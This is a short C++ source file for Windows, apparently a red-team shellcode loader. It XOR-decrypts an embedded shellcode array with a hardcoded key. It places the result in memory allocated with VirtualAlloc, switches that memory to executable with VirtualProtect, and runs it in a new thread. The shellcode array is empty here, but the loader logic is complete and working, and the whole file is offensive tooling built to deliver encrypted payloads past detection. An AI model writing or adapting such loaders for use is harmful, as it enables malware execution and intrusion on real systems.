#include <windows.h>
#include <iostream>

// Hardcoded encrypted shellcode
unsigned char encrypted_shellcode[] = { };
const size_t shellcode_size = sizeof(encrypted_shellcode);

// Decryption key (same as used in the Encryptor)
const std::string key = "redteamexercises";

// XOR decryption function
void xor_decrypt(unsigned char* data, size_t size, const std::string& key) {
    for (size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key.size()];
    }
}

int main() {
    std::cout << "[+] Starting decryption and shellcode execution..." << std::endl;

    // Decrypt the shellcode
    xor_decrypt(encrypted_shellcode, shellcode_size, key);

    // Allocate RW (Read-Write) memory
    void* exec_mem = VirtualAlloc(nullptr, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) {
        std::cerr << "[-] Memory allocation failed\n";
        return 1;
    }

    // Copy decrypted shellcode to allocated memory
    memcpy(exec_mem, encrypted_shellcode, shellcode_size);

    // Change memory permissions to RX (Read-Execute)
    DWORD oldProtect;
    if (!VirtualProtect(exec_mem, shellcode_size, PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] Failed to modify memory permissions\n";
        return 1;
    }

    std::cout << "[+] Executing shellcode..." << std::endl;

    // Create a thread to execute the shellcode
    HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)exec_mem, nullptr, 0, nullptr);
    if (!hThread) {
        std::cerr << "[-] Failed to create thread\n";
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
